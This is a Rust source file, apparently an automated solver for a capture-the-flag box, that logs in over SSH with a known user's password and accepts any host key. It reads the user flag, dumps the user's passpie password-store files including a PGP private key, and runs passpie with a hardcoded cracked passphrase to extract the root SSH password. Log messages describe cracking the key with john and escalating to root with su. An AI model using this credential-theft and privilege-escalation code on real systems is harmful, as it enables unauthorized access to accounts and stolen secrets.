use std::path::Path;
use std::sync::Arc;
use std::time::Duration;
use async_trait::async_trait;
use log::{error, info, warn};
use russh::*;
use russh_keys::*;
use tokio::io::AsyncWriteExt;
use tokio::net::ToSocketAddrs;

pub struct SSHClient {
    pub session: Session,
}

impl SSHClient {
    pub async fn build(ssh_credentials: (String, String), host: String) {
        info!("Jnelson ssh credential: {}", ssh_credentials.1.clone());
        let mut ssh = Session::connect(
            ssh_credentials.1,
            ssh_credentials.0.clone(),
            (host.clone(), 22u16),
        )
            .await
            .expect("Oops, SSH cannot connect.");

        info!("Wuhoo! SSH Connected");
        //CODE
        let homd_dir = format!("/home/{}/user.txt", ssh_credentials.0);
        let home_dir_cmd = format!("cat {}", homd_dir);
        let user_flag_command: &str = home_dir_cmd.as_str();
        let user_flag = ssh
            .call(
                user_flag_command,
                true

            )
            .await
            .expect("user flag command failed");

        info!("user flag got: {}", user_flag);

        let rootpass_dir = format!("/home/{}/.passpie/ssh/root.pass", ssh_credentials.0);
        let rootpass_cmd = format!("cat {}", rootpass_dir);
        let get_pass_command: &str = rootpass_cmd.as_str();
        let _pgp_message = ssh
            .call(
                get_pass_command,
                true

            )
            .await
            .expect("user flag command failed");

       // info!("pgp message file got: {}", pgp_message);

        let passpie_dir = format!("/home/{}/.passpie/.keys", ssh_credentials.0);
        let passpie_cmd = format!("cat {}", passpie_dir);
        let get_pgp_command: &str = passpie_cmd.as_str();
        let _pgp_file = ssh
            .call(
                get_pgp_command,
                true

            )
            .await
            .expect("user flag command failed");

        //info!("pgp key file got: {}", pgp_file);
        warn!("I will take a break here. It just takes too much to \
               brute force PGP on rust, and I dont want to run your john to crack it either,\
               so I will just get the password I cracked before and use it to fetch root flag. \
               If you want, you can always get the above pgp key file, copy its private key, and \
               decrypt with john, and then ssh into the box to get the root password yourself");

        let passpie_password = "blink182";

        let rootssh_cmd = format!("passpie copy --to stdout --passphrase {} root@ssh", passpie_password,);
        let rootssh_command: &str = rootssh_cmd.as_str();
        let root_ssh = ssh
            .call(
                rootssh_command,
                true

            )
            .await
            .expect("user flag command failed");

        info!("root ssh password got: {}", root_ssh);

        //close jnelson session.
        ssh.close().await.unwrap();
        info!("Wuhoo! SSH channel closed.");
        warn!("I am not that familiar with ssh on rust. After some due research, I still don't \
        know how to deal with password prompt when I 'su -' in a ssh session. So I will leave the rest \
        to you. SSH into jenlson's account, `su -` into root, feed it with the root password, and you will \
        get yourself root.txt.");
        warn!("Lastly, if you know how to deal with password prompt, I really appreciate it if you like to share with me. Thanks.");


        ssh.close().await.unwrap();

    }
}

//The following wrapper are all from: https://github.com/warp-tech/russh/blob/main/russh/examples/client_exec_simple.rs
//with minor adjustment: change from private key auth to password auth, get rid of error handle (cause I'm lazy...)
struct Client {}

// More SSH event handlers
// can be defined in this trait
// In this example, we're only using Channel, so these aren't needed.
#[async_trait]
impl client::Handler for Client {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _server_public_key: &key::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

pub struct Session {
    session: client::Handle<Client>,
}


impl Session {
    async fn connect<A: ToSocketAddrs>(
        password: String,
        user: impl Into<String>,
        addrs: A,
    ) -> Result<Self, ()> {
        let config = client::Config {
            inactivity_timeout: Some(Duration::from_secs(5)),
            ..<_>::default()
        };

        let config = Arc::new(config);
        let sh = Client {};

        let mut session = client::connect(config, addrs, sh).await.unwrap();
        let auth_res = session
            .authenticate_password(user, password)
            .await.unwrap();

        if !auth_res {
            error!("Authentication failed");
        }

        Ok(Self { session })
    }

    async fn call(&mut self, command: &str, want_reply: bool) -> Result<String, ()> {
        let mut channel = self.session.channel_open_session().await.unwrap();
        //for cmd in command {

        channel.exec(want_reply, command).await.unwrap();


        //}

        let mut code = None;
        let mut stdout = tokio::io::stdout();
        let mut ret_data = "".to_string();

        loop {
            // There's an event available on the session channel
            let Some(msg) = channel.wait().await else {
                break;
            };
            match msg {
                // Write data to the terminal
                ChannelMsg::Data { ref data } => {
                    ret_data = String::from_utf8(data.to_vec()).unwrap();
                    //stdout.write_all(data).await.unwrap();
                    //stdout.flush().await.unwrap();
                }
                // The command has returned an exit code
                ChannelMsg::ExitStatus { exit_status } => {
                    code = Some(exit_status);
                    // cannot leave the loop immediately, there might still be more data to receive
                }
                _ => {}
            }
        }
        Ok(ret_data)
    }

    async fn close(&mut self) -> Result<(), ()> {
        self.session
            .disconnect(Disconnect::ByApplication, "", "English")
            .await.unwrap();
        Ok(())
    }
}